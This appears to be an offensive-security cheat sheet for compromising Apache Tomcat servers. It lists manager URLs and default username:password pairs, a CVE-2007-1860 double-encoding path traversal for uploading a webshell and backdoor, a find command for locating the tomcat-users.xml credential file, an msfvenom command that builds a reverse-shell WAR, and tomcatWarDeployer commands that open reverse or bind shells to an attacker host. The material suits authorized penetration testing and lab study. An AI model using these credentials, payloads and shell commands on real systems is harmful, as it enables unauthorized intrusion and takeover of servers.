### Tomcat


Path:upload and deploy war files

```
/manager/html
```

Path: version
```
/manager/status
```


#### Default user:pass

```
admin:admin

tomcat:tomcat

admin:<NOTHING>

admin:s3cr3t

tomcat:s3cr3t

admin:tomcat
```

#### CVE-2007-1860
Double URL encode path traversal
- Access the management web path/%252E%252E/manager/html
- Upload webshell
- send cookie and/or a SSRF token
- Access backdoor

#### Remote Code Execution (RCE)

Upload and deploy a .war file if you have enough privileges

- admin
- manager
- manager-script

Find these in /usr/share/tomcat9/etc/tomcat-users.xml

```
find / -name tomcat-users.xml 2>/dev/null
```


#### Reverse Shell WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IPADD LPORT=PORT -f war -o revshell.war
```

#### Bind & Reverse Shell

- [mgeeky git](https://github.com/mgeeky/tomcatWarDeployer)

```
# reverse
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/

# bind

./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```


